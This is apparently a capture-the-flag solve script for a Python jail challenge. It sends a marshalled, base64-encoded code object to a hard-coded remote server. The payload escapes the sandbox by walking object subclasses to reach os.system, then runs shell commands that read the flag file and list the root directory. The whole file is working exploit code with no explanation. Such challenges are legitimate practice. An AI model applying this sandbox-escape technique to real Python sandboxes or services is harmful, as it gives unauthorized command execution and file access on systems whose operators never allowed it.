#!/usr/bin/env python3
# pyjail?! (challenge 82, Python 3.13)

import base64
import marshal
import socket
import sys

ENTRY = ("103.163.47.230", 35154)
IDX = 159


def build(expr):
    return base64.b64encode(marshal.dumps(compile(expr, "<p>", "eval")))


def run(expr, wait=0.6):
    s = socket.create_connection(ENTRY, timeout=8)
    s.settimeout(3)
    try:
        s.recv(1024)
    except Exception:
        pass
    s.sendall(build(expr) + b"\n")
    import time
    time.sleep(wait)
    out = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            out += c
    except Exception:
        pass
    s.close()
    return out


if __name__ == "__main__":
    if sys.version_info[:2] != (3, 13):
        sys.exit("need python 3.13 for marshal compatibility")
    expr = (f"().__class__.__base__.__subclasses__()[{IDX}]"
            f".__init__.__globals__['system']('cat /flag;cat flag;ls /')")
    print(run(expr).decode("utf-8", "replace"))
